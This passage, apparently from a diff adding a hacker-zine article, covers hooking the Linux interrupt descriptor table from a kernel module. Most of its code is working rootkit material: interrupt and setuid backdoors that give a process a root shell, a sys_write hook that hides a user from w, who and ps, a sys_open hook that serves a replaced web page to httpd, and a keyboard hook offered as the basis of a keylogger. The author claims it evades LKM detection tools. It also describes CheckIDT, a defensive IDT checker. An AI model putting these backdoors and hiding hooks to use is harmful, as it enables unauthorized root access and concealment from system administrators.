+pushl $0 
+pushl $ SYMBOL_NAME(do_####name)
+jmp error_code
+
+
+    It's True.If you give a look in entry.S, they are almost all look like
+this. But not all. Imagine you wanna hook the syscall's handler, The
+device_not_aivable Handler (even if its not really interesting)or even the
+hardware interrupt....How Will we do it ?
+
+----[ 3.4 - Generic interrupt hooking
+
+We are going to use another technique to hook a handler. Remember, in the 
+handler written in C, we went back to the true C handler thanks to a 
+return. 
+
+Now, we are going to go back in the asm code.
+
+Simple example of handler :
+
+void stub_kad(void)
+        {
+__asm__ (
+        &quot;.globl my_stub                 \n&quot;
+        &quot;.align 4,0x90                  \n&quot;
+        &quot;my_stub:                       \n&quot;
+        &quot;       call *%0                \n&quot;
+        &quot;       jmp  *%1                  \n&quot;
+        ::&quot;m&quot;(hostile_code),&quot;m&quot;(old_stub)
+        );
+        }
+
+Here, we make a call to our fake C handler, the handler is executed and 
+goes back to the asm handler which jumps to the true asm handler !
+
+Our C handler :
+
+asmlinkage void my_function()
+        {
+        printk(&quot;&lt;1&gt;Interrupt %i hijack \n&quot;,interrupt);
+        }
+
+
+What happens ?
+
+We are going to change the address in the idt by the address of our asm 
+handler. This one will jump to our C handler and will go back to our asm 
+handler which, at the end, will jump to the true asm handler the address 
+of which we have saved.
+
+::&quot;m&quot;(hostile_code),&quot;m&quot;(old_stub)
+
+
+For those who had not felt up to read the doc on asm inline, here is the 
+syntax :
+
+asm (
+    assembler instruction
+    : output operands
+    : input operands
+    : list of modified registers
+);
+
+
+You can put asm or __asm__. __asm__ is used to avoid confusion with other 
+vars. You can also put asm volatile, in this case the asm code won't 
+be changed (optimized) during the compilation.
+
+&quot;m&quot;(hostile_code) and &quot;m&quot;(old_stub) are input operands. The first one is 
+equal to %0, the second one to %1, ... So call %0 is equal to call 
+hostile_code. &quot;m&quot; means memory address. hostile_code corresponds to the 
+address of our C handler and old_stub to the address of the handler that 
+was in the idt previously. If this seems impossible to understand, I advice
+you to read the doc on asm inline [1]. 
+
+The whole code is in annexe. All the next codes comes from this code. 
+In each new example, I will only show the asm handler et the C handler. 
+The rest will be the same. 
+
+
+First concrete example :
+
+bash-2.05# cat test.c
+#include &lt;stdio.h&gt;
+
+int main ()
+{
+  int a=8,b=0;
+  printf(&quot;A/B = %i\n&quot;,a/b);
+  return 0;
+}
+bash-2.05# gcc -I/usr/src/linux/include -O2 -c hookstub-V0.2.c
+bash-2.05# insmod hookstub-V0.2.o interrupt=0
+Inserting hook
+Hooking finish
+bash-2.05# ./test
+Floating point exception
+Interrupt 0 hijack
+bash-2.05# rmmod hookstub-V0.2
+Removing hook
+bash-2.05#
+
+Good ! We see the &quot;Interrupt hijack&quot;.
+
+In this code, we use MODULE_PARM which will allow to give parameters during
+the module insertion. For further information about this syntax, read 
+&quot;linux device drivers&quot; from o'reilly [2] (chapter 2). This will allow us 
+to hook a chosen interrupt with the same module.
+
+
+----[ 3.5 - Hooking for profit : our first backdoor
+
+This first very simple backdoor will allow us to obtain a root shell. 
+The C handler is going to give the root rights to the process that has 
+generated the interrupt.
+
+Asm handler
+------------
+
+void stub_kad(void)
+        {
+__asm__ (
+        &quot;.globl my_stub                 \n&quot;
+        &quot;.align 4,0x90                  \n&quot;
+        &quot;my_stub:                       \n&quot;
+        &quot;       pushl %%ebx             \n&quot;
+        &quot;       movl %%esp,%%ebx        \n&quot;
+        &quot;       andl $-8192,%%ebx       \n&quot;
+        &quot;       pushl %%ebx             \n&quot;
+        &quot;       call *%0                \n&quot;
+        &quot;       addl $4,%%esp           \n&quot;
+        &quot;       popl %%ebx              \n&quot;
+        &quot;       jmp  *%1                \n&quot;
+        ::&quot;m&quot;(hostile_code),&quot;m&quot;(old_stub)
+        );
+        }
+
+We give to the C handler the address of the current process descriptor. 
+We get it back like in error_code, thanks to the macro GET_CURRENT : 
+
+#define GET_CURRENT(reg) \
+    movl %esp, reg; \
+    andl $-8192, reg;
+
+defined in entry.S.
+
+rem : We can also use current instead.
+
+We put the result on the stack and we call our function. The rest of the 
+asm code puts the stack back in its previous state and jumps to the
+true handler.
+
+
+C handler :
+-------------
+...
+unsigned long hostile_code=(unsigned long)&amp;my_function;
+...
+
+asmlinkage void my_function(unsigned long addr_task)
+        {
+        struct task_struct *p = &amp;((struct task_struct *) addr_task)[0];
+    	if(strcmp(p-&gt;comm,&quot;give_me_root&quot;)==0 )
+                {
+                p-&gt;uid=0;
+                p-&gt;gid=0;
+                }
+        }
+
+We declare a pointer on the current process descriptor. We compare the name
+of the process with a name we have chosen. We must not attribute the root 
+rights to all the process which would generate this interrupt. If it is 
+the good process, then we can give it new rights.
+
+&quot;give_me_root&quot; is a little program which launch a shell 
+(system(&quot;/bin/sh&quot;)). We will only have to put a breakpoint before system
+ to launch a shell with the root rights. 
+
+In practice :
+--------------
+
+bash-2.05# gcc -I/usr/src/linux/include -O2 -c hookstub-V0.3.2.c
+bash-2.05# insmod hookstub-V0.3.2.o interrupt=3
+Inserting hook
+Hooking finish
+bash-2.05#
+
+///// in another shell //////
+
+sh-2.05$ cat give_me_root.c
+#include &lt;stdio.h&gt;
+
+int main (int argc, char ** argv)
+    {
+    system(&quot;/bin/sh&quot;);
+    return 0;
+    }
+
+sh-2.05$ gcc -o give_me_root give_me_root.c
+sh-2.05$ id
+uid=1000(kad) gid=100(users) groups=100(users)
+sh-2.05$ gdb give_me_root -q
+(gdb) b main
+Breakpoint 1 at 0x80483f6
+(gdb) r
+Starting program: /tmp/give_me_root
+
+Breakpoint 1, 0x080483f6 in main ()
+(gdb) c
+Continuing.
+sh-2.05# id
+uid=0(root) gid=0(root) groups=100(users)
+sh-2.05#
+
+We are root. The code is in annexe, CODE 2.
+
+
+----[ 3.6 - Hooking for fun
+
+A program that could be interesting is an exception tracer. We could for 
+example hook all the exceptions to print the name of the process that has 
+provoked the exception. We could know all the time who launch what. 
+We could also print the values of the registers. 
+There is a function show_regs that is in  arch/i386/kernel/process.c :
+
+void show_regs(struct pt_regs * regs)
+{
+    long cr0 = 0L, cr2 = 0L, cr3 = 0L;
+
+    printk(&quot;\n&quot;);
+    printk(&quot;EIP: %04x:[&lt;%08lx&gt;]&quot;,0xffff &amp; regs-&gt;xcs,regs-&gt;eip);
+    if (regs-&gt;xcs &amp; 3)
+        printk(&quot; ESP: %04x:%08lx&quot;,0xffff &amp; regs-&gt;xss,regs-&gt;esp);
+    printk(&quot; EFLAGS: %08lx\n&quot;,regs-&gt;eflags);
+    printk(&quot;EAX: %08lx EBX: %08lx ECX: %08lx EDX: %08lx\n&quot;,
+        regs-&gt;eax,regs-&gt;ebx,regs-&gt;ecx,regs-&gt;edx);
+    printk(&quot;ESI: %08lx EDI: %08lx EBP: %08lx&quot;,
+        regs-&gt;esi, regs-&gt;edi, regs-&gt;ebp);
+    printk(&quot; DS: %04x ES: %04x\n&quot;,
+        0xffff &amp; regs-&gt;xds,0xffff &amp; regs-&gt;xes);
+    __asm__(&quot;movl %%cr0, %0&quot;: &quot;=r&quot; (cr0));
+    __asm__(&quot;movl %%cr2, %0&quot;: &quot;=r&quot; (cr2));
+    __asm__(&quot;movl %%cr3, %0&quot;: &quot;=r&quot; (cr3));
+    printk(&quot;CR0: %08lx CR2: %08lx CR3: %08lx\n&quot;, cr0, cr2, cr3);
+}
+
+You can use this code to print the state of the registers at every 
+exception.
+
+    Something more dangerous would be to change the asm handler so that it
+would not execute the true C handler. The process that has generated the
+exception would not receive such signals as SIGSTOP or SIGSEGV. This would
+be very useful in some situations.
+
+
+--[ 4 - THE HARDWARE INTERRUPTS
+
+----[ 4.1 - How does it works ?
+
+    We can also hook interrupts generated by IRQs with the same method but 
+they are less interesting to hook (unless you have a great idea ;). We are 
+going to hook interrupt 33 which is keyboard's. The problem is that this 
+interrupt happens a lot more. The handler will be executed a large number 
+of times and will have to go very fast to not block the system. To avoid 
+this, we are going to use bottom half. There are functions of low priority
+which are used for interrupt handling in most cases . The kernel is waiting
+for the adequate time to launch it, and other interruptions are not masked 
+during its execution
+ 
+The waiting bottom half will be executed only at the following:
+
+- the kernel finishes to handle a syscall
+- the kernel finishes to handle a exception 
+- the kernel finishes to handle a interrupt
+- the kernel uses the schedule() function in order to select a new
+process 
+
+But they will be executed before the processor goes back in user mode. 
+
+So the bottom half are useful to ensure the quick handle of an
+interruption.
+
+Here are some examples of linux used bottom halves
+
+----------------+-------------------------------+
+Bottom half     |       Peripheral equipment    |
+----------------+-------------------------------+
+CONSOLE_BH      |       Virtual console         |
+IMMEDIATE_BH    |       Immediate tasks file    |
+KEYBOARD_BH     |       Keyboard                |
+NET_BH          |       Network interface       |
+SCSI_BH         |       SCSI interface          |
+TIMER_BH        |       Clock                   |
+TQUEUE_BH       |       Periodic tasks queue    |
+...             |                               |
+----------------+-------------------------------+
+
+
+    My goal writing this paper is not to study the bottom halves, as it's a
+too wide topic. Anyway, for more informations about that topic, you can
+have a look at
+
+http://users.win.be/W0005997/UNIX/LINUX/IL/kernelmechanismseng.html [8]
+
+IRQ list
+--------
+
+BEWARE ! : the number of the interrupts are not always the same for the 
+IRQs!
+
+----+---------------+----------------------------------------
+IRQ | Interrupt     | Peripheral equipment
+----+---------------+----------------------------------------
+0   | 32            | Timer
+1   | 33            | Keyboard
+2   | 34            | PIC cascade
+3   | 35            | Second serial port
+4   | 36            | First serial port
+6   | 37            | Floppy drive
+8   | 40            | System clock
+11  | 43            | Network interface
+12  | 44            | PS/2 mouse
+13  | 45            | Mathematic coprocessor
+14  | 46            | First EIDE disk controller
+15  | 47            | Second EIDE disk controller
+----+---------------+----------------------------------------
+
+
+----[ 4.2 - Initialization and activation of a bottom half
+
+    The low parts must be initialized with the function init_bh(n,routine)
+that insert the address routine in the n-th entry of bh_base (bh_base is an
+array where low parts are kept). When it is initialized, it can be
+activated and executed. The function mark_bh(n) is used by the interrupt
+handler to activate the n-th low part.
+
+The tasklets are the functions themselves. There are put together in list 
+of elements of type tq_struct :
+
+struct tq_struct {
+    struct tq_struct *next;     /* linked list of active bh's */
+    unsigned long sync;     /* must be initialized to zero */
+    void (*routine)(void *);    /* function to call */
+    void *data;         /* argument to function */
+};
+
+    The macro DELACRE_TASK_QUEUE(name,fonction,data) allow to declare a
+tasklet that will then be inserted in the task queue thanks to the function
+queue_task. There is several task queues, the most interesting here is
+tq_immediate that is executed by the bottom half IMMEDIATE_BH (immediate
+task queue).
+
+(include/linux/tqueue.h)
+
+
+----[ 4.3 - Hooking of the keyboard interrupt
+
+    When we hit a key, the interrupt happens twice. Once when we push the
+key and once when we release the key. The code below will display a message
+every 10 interrupts. If we hit 5 keys, the message appears.
+
+I don't show the asm handler which is the same as in 3.4
+
+Code
+----
+...
+struct Variable
+    {
+    int entier;
+    char chaine[10];
+    };
+...
+static void evil_fonction(void * status)
+        {
+    struct Variable *var = (struct Variable * )status;
+    nb++;
+        if((nb%10)==0)printk(&quot;Bottom Half %i integer : %i string : %s\n&quot;,
+	nb,var-&gt;entier,var-&gt;chaine);
+        }
+...
+asmlinkage void my_function()
+        {
+        static struct Variable variable;
+        static struct tq_struct my_task = {NULL,0,evil_fonction,&amp;variable};
+	variable.entier=3;
+    	strcpy(variable.chaine,&quot;haha hijacked key :) &quot;);
+        queue_task(&amp;my_task,&amp;tq_immediate);
+        mark_bh(IMMEDIATE_BH);
+        }
+
+
+    We declare a tasklet my_task. We initialize it with our function and
+the argument. As the tasklet allow us to take only one argument, we give
+the address of a structure. This will allow to use several arguments. We
+add the tasklet to the list tq_immediate thanks to queue_task. Finally, we 
+activate the low part IMMEDIATE_BH thanks to mark_bh:
+
+mark_bh(IMMEDIATE_BH) 
+
+    We have to activate IMMEDIATE_BH, which handles the tasks queue
+'tq_immediate' (the one where we added our own tasklet) evil_function is to
+be executed just after one of the requested event (listed in part 4.1)
+
+    evil_function is just going to display a message each time that the 
+interrupt happened 10 times. We effectively hooked the keyboard interrupt.
+We could use this method to code a keylogger. This one would be the most
+quiet because it would act at interrupts level. The issue, that I didn't
+solve, is to know which key has been hit. To do this, we can use the
+function inb() that can read on a I/O port. There are 65536 I/O ports 
+(8 bits ports). 2 8 bits ports make a 16 bits ports and 2 16 bits ports 
+make a 32 bits ports. The functions that allow us to access ports are: 
+
+inb,inw,inl    : allow to read 1, 2 or 4 consecutive bytes from a I/O port.
+outb,outw,outl : allow to write 1, 2 or 4 consecutive bytes to a I/O port.
+
+
+    So we can read the scancode of the keyboard thanks to the function inb,
+and its status (pushed, released). Unfortunately, I'm not sure of the port
+to read. The port for the scancode is 0x60 and the port for the status is
+0x64.
+
+scancode=inb(0x60);
+status=inb(0x64);
+
+
+    scancode is going to be equal to a value that will have to be
+transformed to know which key has been hit. This is realized with an array
+of value. It may exist a function that give directly the conversion, but
+I'm not sure. If anyone has information about it or wish to develop the
+topic, he can contact me.
+
+
+--[ 5 - THE EXCEPTION PROGRAMMED FOR THE SYSTEM CALL
+
+----[ 5.1 - List of the syscalls
+
+You can find a list of all the syscalls at the url : 
+http://www.lxhp.in-berlin.de/lhpsysc0.html [3]. 
+All syscalls are listed and the value to put in the registers are given.
+
+Rem : be ware, the numbers of the syscalls are not the same in 2.2.* 
+and 2.4.* kernels.
+
+
+----[ 5.2 - How does a syscall work ?
+
+    Thanks to the technique that we have just used here, we can also hook
+the syscalls. When a syscall is called, all the parameters of the syscall 
+are in the registers.
+
+eax : number of the called syscall
+ebx : first param
+ecx : second param
+edx : third param
+esi : fourth param
+edi : fifth param
+
+    The maximum number of arguments can't exceed 5. However, some syscalls
+need more than 5 arguments. It is the case for the syscall mmap (6 params). 
+In such a case, a single register is used to point to a memory area to the 
+addressing space of the process in user mode that contains the values of 
+the parameters.
+
+    We can get these values thanks to the structure pt_regs that we've seen
+before. We are going to hook syscalls at the IDT level and not in the
+syscall_table. kstat and all currently available LKM detection tools will
+fail in detecting our voodoo. I won't show you all what can be done by
+hooking the syscalls, the technique used by pragmatic or so in their LKMs
+are applicable here. I will show you how to hook some syscalls, you will
+be able to hook those you want using the same technique.
+
+
+----[ 5.3 - Hooking for profit
+
+------[ 5.3.1 - Hooking of sys_setuid
+
+SYS_SETUID:
+-----------
+
+EAX: 213
+EBX: uid
+
+We are going to begin with a simple case, a backdoor that change the rights
+of a process into root. The same backdoor as in 3.5 but we are going to 
+hook the syscall setuid.
+
+asm handler :
+--------------
+...
+#define sys_number 213
+...
+void stub_kad(void)
+        {
+__asm__ (
+        &quot;.globl my_stub                 \n&quot;
+        &quot;.align 4,0x90                  \n&quot;
+        &quot;my_stub:                       \n&quot;
+                //save the register value
+                &quot;       pushl %%ds                      \n&quot;
+                &quot;       pushl %%eax                     \n&quot;
+                &quot;       pushl %%ebp                     \n&quot;
+                &quot;       pushl %%edi                     \n&quot;
+                &quot;       pushl %%esi                     \n&quot;
+                &quot;       pushl %%edx                     \n&quot;
+                &quot;       pushl %%ecx                     \n&quot;
+                &quot;       pushl %%ebx                     \n&quot;
+                //compare if it's the good syscall
+                &quot;       xor %%ebx,%%ebx                 \n&quot;
+                &quot;       movl %2,%%ebx                   \n&quot;
+                &quot;       cmpl %%eax,%%ebx                \n&quot;
+                &quot;       jne finis                       \n&quot;
+                //if it's the good syscall, 
+		//put top stack address on stack :)
+                &quot;       mov %%esp,%%edx                 \n&quot;
+                &quot;       mov %%esp,%%eax                 \n&quot;
+                &quot;       andl $-8192,%%eax               \n&quot;
+                &quot;       pushl %%eax                     \n&quot;
+                &quot;       push %%edx                      \n&quot;
+                &quot;       call *%0                        \n&quot;
+                &quot;       addl $8,%%esp                   \n&quot;
+                &quot;finis:                                 \n&quot;
+                //restore register
+                &quot;       popl %%ebx                      \n&quot;
+                &quot;       popl %%ecx                      \n&quot;
+                &quot;       popl %%edx                      \n&quot;
+                &quot;       popl %%esi                      \n&quot;
+                &quot;       popl %%edi                      \n&quot;
+                &quot;       popl %%ebp                      \n&quot;
+                &quot;       popl %%eax                      \n&quot;
+                &quot;       popl %%ds                       \n&quot;
+                &quot;       jmp  *%1                        \n&quot;
+        ::&quot;m&quot;(hostile_code),&quot;m&quot;(old_stub),&quot;i&quot;(sys_number)
+        );
+        }
+
+
+- we save the values of all the registers on the stack
+- we compare eax that contains the number of the syscall with the value 
+  of sys_number that we have defined above.
+- if it is the good syscall, we put on the stack the value of esp from 
+  which have saved all the registers (that will be used for pt_regs) and 
+  the current process descriptor.
+- we call our C handler, then at the return, we pop 8 bytes (eax + edx).
+- finis : we put back the value of our registers and we call the true 
+  handler.
+
+By changing the value of sys_number, we can hook any syscall with this asm 
+handler.
+
+
+C handler
+----------
+
+asmlinkage void my_function(struct pt_regs * regs,unsigned long fd_task)
+        {
+        struct task_struct *my_task = &amp;((struct task_struct *) fd_task)[0];
+        if (regs-&gt;ebx == 12345 )
+                {
+                my_task-&gt;uid=0;
+                my_task-&gt;gid=0;
+                my_task-&gt;suid=1000;
+                }
+        }
+
+We get the value of the registers in a pt_regs structure and the address 
+of the current fd. We compare the value of ebx with 12345, if it is equal 
+then we set the uid and the gid of the current process to 0.
+
+
+In practice :
+--------------
+
+bash-2.05$ cat setuid.c
+#include &lt;stdio.h&gt;
+int main (int argc,char ** argv)
+    {
+    setuid(12345);
+    system(&quot;/bin/sh&quot;);
+    return 0;
+    }
+bash-2.05$ gcc -o setuid setuid.c
+bash-2.05$ ./setuid
+sh-2.05# id
+uid=0(root) gid=0(root) groups=100(users)
+sh-2.05#
+
+
+We are root. This technique can be used with many syscalls.
+
+
+------[ 5.3.2 - Hooking of sys_write
+
+SYS_WRITE:
+----------
+
+EAX: 4
+EBX: file descriptor
+ECX: ptr to output buffer
+EDX: count of bytes to send
+
+We are going to hook sys_write so that it will replace a string in a 
+defined program. Then, we will hook sys_write so that it will replace 
+in the whole system. 
+
+The asm handler in the same as in 5.3.1
+
+
+C handler
+----------
+
+asmlinkage char * my_function(struct pt_regs * regs,unsigned long fd_task)
+        {
+        struct task_struct *my_task= &amp;((struct task_struct *) fd_task) [0];
+        char *ptr=(char *) regs-&gt;ecx;
+        char * buffer,*ptr3;
+
+        if(strcmp(my_task-&gt;comm,&quot;w&quot;)==0 || strcmp(my_task-&gt;comm,&quot;who&quot;)==0||
+	    strcmp(my_task-&gt;comm,&quot;lastlog&quot;)==0 || 
+	    ((progy != 0)?(strcmp(my_task-&gt;comm,progy)==0):0) )
+               {
+                buffer=(char * ) kmalloc(regs-&gt;edx,GFP_KERNEL);
+                copy_from_user(buffer,ptr,regs-&gt;edx);
+                if(hide_string)
+                        {
+                         ptr3=strstr(buffer,hide_string);
+                        }
+                else
+                        {
+                         ptr3=strstr(buffer,HIDE_STRING);
+                        }
+                if(ptr3 != NULL )
+                        {
+                        if (false_string)
+                        {
+                           strncpy(ptr3,false_string,strlen(false_string));
+                             }
+                        else
+                        {
+                           strncpy(ptr3,FALSE_STRING,strlen(FALSE_STRING));
+                                }
+                        copy_to_user(ptr,buffer,regs-&gt;edx);
+                        }
+                kfree(buffer);
+                }
+        }
+
+- We compare the name of the process with a defined program name and with 
+  the name that we will specify in param when we insert our module 
+  (progy param).
+- We allocate some space for the buffer that will receive the string that 
+  is in regs-&gt;ecx
+- We copy the string that sys_write is going to write from the userland to 
+  the kernelland (copy_from_user)
+- We search for the string we want to hide in the string that sys_write is 
+  going to write.
+- If found,we change the string to be hidden with the one wanted in 
+  our buffer.
+- we copy the false string in the userland (copy_to_user)
+
+
+In practice :
+--------------
+
+%gcc -I/usr/src/linux/include -O2 -c hookstub-V0.5.2.c
+%w
+ 12:07am  up 38 min,  2 users,  load average: 0.60, 0.60, 0.48
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU  WHAT
+kad      tty1     -                11:32pm 35:15  14:57   0.03s  sh /usr/X11/bin/startx
+kad      pts/1    :0.0             11:58pm  8:51   0.08s  0.03s  man setuid
+%modinfo hookstub-V0.5.2.o
+filename:    hookstub-V0.5.2.o
+description: &quot;Hooking of sys_write&quot;
+author:      &quot;kad&quot;
+parm:        interrupt int, description &quot;Interrupt number&quot;
+parm:        hide_string string, description &quot;String to hide&quot;
+parm:        false_string string, description &quot;The fake string&quot;
+parm:        progy string, description &quot;You can add another program to fake&quot;
+%insmod hookstub-V0.5.2.o interrupt=128 hide_string=kad false_string=marcel 
+progy=ps
+Inserting hook
+Hooking finish
+
+%w
+ 12:07am  up 38 min,  2 users,  load average: 0.63, 0.61, 0.48
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU  WHAT
+marcel   tty1     -                11:32pm 35:21  15:01   0.03s  sh /usr
+marcel   pts/1    :0.0             11:58pm  8:57   0.08s  0.03s  man setuid
+
+%ps -au
+USER       PID %CPU %MEM   VSZ  RSS TTY      STAT START   TIME COMMAND
+marcel     133  0.0  1.4  2044 1256 pts/0    S    May12   0:00 -bash
+root       146  0.0  1.4  2032 1260 pts/0    S    May12   0:00 -su
+root       243  0.0  1.6  2612 1444 pts/0    S    00:05   0:00 -sh
+root       259  0.0  0.9  2564  836 pts/0    R    00:07   0:00 ps -au
+%
+
+    The string &quot;kad&quot; is hidden. The whole source code is in annexe CODE 3. 
+This example is quite simple but could be more interesting. Instead of 
+changing &quot;kad&quot; with &quot;marcel&quot;, we could change our IP address with
+another. And, instead of hooking the output of w, who or lastlog, we could
+use klogd...
+
+
+Complete hooking of sys_write
+------------------------------
+
+The complete hooking of sys_write can be useful in some case, like for example 
+changing an IP with another. But if you change a string completely, 
+you won't be hidden long. If you change a string with another, it's the whole 
+system that will be changed. Even a simple cat will be influenced :
+
+%insmod hookstub-V0.5.3.o interrupt=128 hide_string=&quot;hello!&quot; false_string=&quot;bye!  &quot;
+Inserting hook
+Hooking finish
+%echo hello!
+bye!
+%
+
+
+The C handler for this example is the same as the previous one without the 
+if condition. Beware, this could slow down your system a lot.
+
+
+----[ 5.4 - Hooking for fun
+
+This example is only &quot;for fun&quot; :), don't misuse it. You could turn an admin 
+mad... Thanks to Spacewalker for the idea (Hi Space ! :). The idea is to hook 
+the syscall sys_open so that it opens another file instead of a defined file, 
+but only if it is a defined &quot;entity&quot; that opens the file. This entity will be 
+httpd here...
+
+SYS_OPEN:
+---------
+
+EAX : 5
+EBX : ptr to pathname
+ECX : file access
+EDX : file permissions
+
+The asm handler is always the same as the previous ones.
+
+C handler :
+------------
+
+asmlinkage void my_function(struct pt_regs * regs,unsigned long fd_task)
+        {
+        struct task_struct *my_task = &amp;((struct task_struct * ) fd_task) [0];
+    if(strcmp(my_task-&gt;comm,&quot;httpd&quot;) == 0)
+        {
+        if(strcmp((char *)regs-&gt;ebx,&quot;/var/www/htdocs/index.html.fr&quot;)==0)
+            {
+            copy_to_user((char *)regs-&gt;ebx,&quot;/tmp/hacked&quot;,
+	    strlen((char *) regs-&gt;ebx));
+            }
+        }
+        }
+
+    We hook sys_open, if httpd call sys_open and tries to open index.html,
+then we change index.html with another page we've chosen. We can also use
+MODULE_PARM to more easily change the page. If someone opens the file with
+a classic editor, he will see the true index.html!
+
+    Hooking a syscall is very easy with this technique. Moreover, few
+modifications are to be done for hooking this or that syscall. The only
+thing to change is the C handler. We could however play with the asm
+handler, for example to invert 2 syscalls. We would only have to compare
+the value of eax and to change it with the number of a defined syscall. 
+For an admin, we could hook the &quot;hot&quot; syscalls and warn with a message as
+soon as the syscall is called. We would be warned of the modifications on
+the syscall_table.
+
+
+--[ 6 - CHECKIDT
+
+    CheckIDT is a little program that I have written that allow to &quot;play&quot;
+with the IDT from the userland. i.e. without using a lkm, thanks to the
+technique of sd and devik in Phrack 58 on /dev/kmem. All along my tests, 
+I had to face many kernel crashes and it was not dead but I couldn't 
+remove the lkm. I had to reboot to change the value of the IDT. CheckIDT
+allow to change the value of the IDT without the use of a lkm. CheckIDT is
+here to help you coding your lkms and prevent you from rebooting all the
+time. On the other hand, this software can warn you of modifications of the
+IDT and so be useful for admins. It can restore the IDT state in tripwire
+style. It saves each descriptor of the IDT in a file, then it compares the
+descriptors with the saved values and put the IDT back if there were
+modifications.
+
+
+Some examples of use :
+-----------------------
+
+%./checkidt
+CheckIDT V 1.1 by kad
+---------------------
+Option :
+       -a nb    show all info about one interrupt
+       -A       show all info about all interrupt
+       -I       show IDT address
+       -c       create file archive
+       -r       read file archive
+       -o file  output filename (for creating file archive)
+       -C       compare save idt &amp; new idt
+       -R       restore IDT
+       -i file  input filename to compare or read
+       -s       resolve symbol thanks to /boot/System.map
+       -S file  specify a map file
+
+
+%./checkidt -a 3 -s
+
+Int *** Stub Address *** Segment *** DPL *** Type             Handler Name
+--------------------------------------------------------------------------
+3       0xc0109370       KERNEL_CS   3       System gate      int3
+
+
+Thanks for choose kad's products :-)
+%
+
+We can obtain information on an interrupt descriptor.
+&quot;-A&quot; allow to obtain information on all interrupts.
+
+
+%./checkidt -c
+
+Creating file archive idt done
+
+Thanks for choosing kad's products :-)
+%insmod hookstub-V0.3.2.o interrupt=3
+Inserting hook
+Hooking finished
+%./checkidt -C
+
+Hey stub address of interrupt 3 has changed!!!
+Old Value : 0xc0109370
+New Value : 0xc583e064
+
+Thanks for choosing kad's products :-)
+%./checkidt -R
+
+Restore old stub address of interrupt 3
+
+Thanks for choosing kad's products :-)
+%./checkidt -C
+
+All values are same
+
+Thanks for choosing kad's products :-)
+%lsmod
+Module                  Size  Used by
+hookstub-V0.3.2          928   0  (unused)
+...
+%
+
+So CheckIDT has restored the values of the IDT as they were before 
+inserting the module. However, the module is still here but has no effect. 
+As in tripwire, I advice you to put the IDT save file in a read only area, 
+otherwise someone could be compromised.
+
+rem : if the module is well hidden, you will also be warned of the modifications 
+of IDT.
+
+The whole source code is in annexe CODE 4.
+
+
+--[ 7 - REFERENCES
+
+[1] http://www.linuxassembly.org/resources.html#tutorials
+    Many docs on asm inline
+
+[2] http://www.xml.com/ldd/chapter/book/
+    linux device drivers
+
+[3] http://www.lxhp.in-berlin.de/lhpsysc0.html
+    detailed syscalls list
+
+[4] http://eccentrica.org/Mammon/
+    Mammon site, thanks mammon ;)
+
+[5] http://www.oreilly.com/catalog/linuxkernel/
+    o'reilly book , great book :)
+
+[6] http://www.tldp.org/LDP/lki/index.html
+    Linux Kernel 2.4 Internals
+
+[7] Sources of 2.2.19 and 2.4.17 kernel
+
+[8] http://users.win.be/W0005997/UNIX/LINUX/IL/kernelmechanismseng.html
+    good info about how bottom half work
+
+[9] http://www.s0ftpj.org/en/tools.html
+    kstat
+
+GREETZ
+
+- Special greetz to freya, django and neuro for helping me to translate
+  this text in English. Greetz again to skyper for his advice, thks a lot
+  man! :)
+- Thanks to Wax for his invaluable advise on asm (don't smoke to much dude !)
+- Big greetz to mayhem, insulted, ptah and sauron for testing the codes 
+  and verifying the text.
+- Greetz to #frogs people, #thebhz people, #gandalf people, #fr people, all 
+  those who were at the RtC.Party, nywass, the polos :) and all those I
+  forget.
+
+
+--[ 8 - Appendix
+
+
+CODE 1: 
+-------
+
+/*****************************************/
+/* hooking interrupt 3 . Idea by mammon  */
+/* with kad modification        	 */
+/*****************************************/
+
+#define MODULE
+#define __KERNEL__
+
+#include &lt;linux/module.h&gt;
+#include &lt;linux/tty.h&gt;
+#include &lt;linux/sched.h&gt;
+#include &lt;linux/init.h&gt;
+#include &lt;linux/malloc.h&gt;
+
+#define error_code 0xc01092d0 //error code in my system.map
+#define do_int3    0xc010977c //do_int3 in my system.map
+
+asmlinkage void my_handler(struct pt_regs * regs,long err_code);
+
+/*------------------------------------------*/
+unsigned long ptr_idt_table;
+unsigned long ptr_gdt_table;
+unsigned long old_stub;
+unsigned long old_handler=do_int3;
+extern asmlinkage void my_stub();
+unsigned long ptr_error_code=error_code;
+unsigned long ptr_handler=(unsigned long)&amp;my_handler;
+/*------------------------------------------*/
+
+struct descriptor_idt
+        {
+        unsigned short offset_low,seg_selector;
+        unsigned char reserved,flag;
+        unsigned short offset_high;
+        };
+
+void stub_kad(void)
+        {
+__asm__ (
+        &quot;.globl my_stub                 \n&quot;
+        &quot;.align 4,0x90                  \n&quot;
+        &quot;my_stub:                       \n&quot;
+        &quot;pushl $0                       \n&quot;
+        &quot;pushl ptr_handler(,1)          \n&quot;
+        &quot;jmp *ptr_error_code             &quot;
+        ::
+        );
+        }
+
+asmlinkage void my_handler(struct pt_regs * regs,long err_code)
+        {
+        void (*old_int_handler)(struct pt_regs *,long) = (void *) old_handler;
+        printk(&quot;&lt;1&gt;Wowowo hijacking de l'int 3 \n&quot;);
+        (*old_int_handler)(regs,err_code);
+        return;
+        }
+
+unsigned long get_addr_idt (void)
+        {
+         unsigned char idtr[6];
+         unsigned long idt;
+        __asm__ volatile (&quot;sidt %0&quot;: &quot;=m&quot; (idtr));
+        idt = *((unsigned long *) &amp;idtr[2]);
+        return(idt);
+        }
+
+void * get_stub_from_idt (int n)
+        {
+        struct descriptor_idt *idte = &amp;((struct descriptor_idt *) ptr_idt_table) [n];
+        return ((void *) ((idte-&gt;offset_high &lt;&lt; 16 ) + idte-&gt;offset_low));
+        }
+
+void hook_stub(int n,void *new_stub,unsigned long *old_stub)
+        {
+         unsigned long new_addr=(unsigned long)new_stub;
+         struct descriptor_idt *idt=(struct descriptor_idt *)ptr_idt_table;
+         //save old stub
+         if(old_stub)
+                *old_stub=(unsigned long)get_stub_from_idt(3);
+         //assign new stub
+         idt[n].offset_high = (unsigned short) (new_addr &gt;&gt; 16);
+         idt[n].offset_low  = (unsigned short) (new_addr &amp; 0x0000FFFF);
+         return;
+        }
+
+int init_module(void)
+        {
+        ptr_idt_table=get_addr_idt();
+        hook_stub(3,&amp;my_stub,&amp;old_stub);
+        return 0;
+        }
+
+void cleanup_module()
+        {
+         hook_stub(3,(char *)old_stub,NULL);
+        }
+
+******************************************************************************
+
+CODE 2:
+-------
+
+/****************************************************/
+/* IDT int3 backdoor. Give root right to the process
+/* Coded by kad
+/****************************************************/
+
+#define MODULE
